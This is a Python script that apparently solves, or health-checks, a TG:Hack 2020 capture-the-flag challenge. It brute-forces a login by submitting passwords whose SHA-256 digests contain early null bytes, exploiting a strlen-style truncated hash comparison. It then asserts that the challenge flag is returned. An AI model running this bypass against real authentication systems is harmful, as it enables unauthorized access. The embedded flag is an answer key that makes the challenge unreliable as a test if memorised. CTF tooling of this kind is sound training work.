#!/usr/bin/env python3
import sys
import requests
import hashlib

def create_passwords():
    prefixes = set()
    passwords = list()
    count = 0
    while(len(passwords) < 256):
        password = str(count)
        count += 1
        enc = hashlib.sha256()
        enc.update(bytes(password, 'ascii'))
        digest = enc.digest()
        if (digest[0] == 0) or (digest[1] == 0):
            index = digest.index(0)
            trunc = digest[:index]
            if not trunc in prefixes:
                prefixes.add(trunc)
                passwords.append(password)
    return passwords

def try_passwords(passwords, endpoint):
    for password in passwords:
        res = requests.post(url = endpoint, data = {'password': password})
        if "TG20" in res.text:
            assert "TG20{strlen_is_bad_mkay}" in res.text
            return
    raise PermissionError

def run_test():
    base_endpoint = ""

    if len(sys.argv) == 1:
        base_endpoint = "https://zero.tghack.no"
    elif len(sys.argv) == 2:
        base_endpoint = sys.argv[1]

    if len(base_endpoint) == 0:
        print(sys.argv[0] + " <endpoint>")
    else:
        passwords = create_passwords()
        try_passwords(passwords, base_endpoint)

try:
    run_test()
except (OSError, AssertionError, NameError):
    sys.exit(102)
else:
    sys.exit(101)
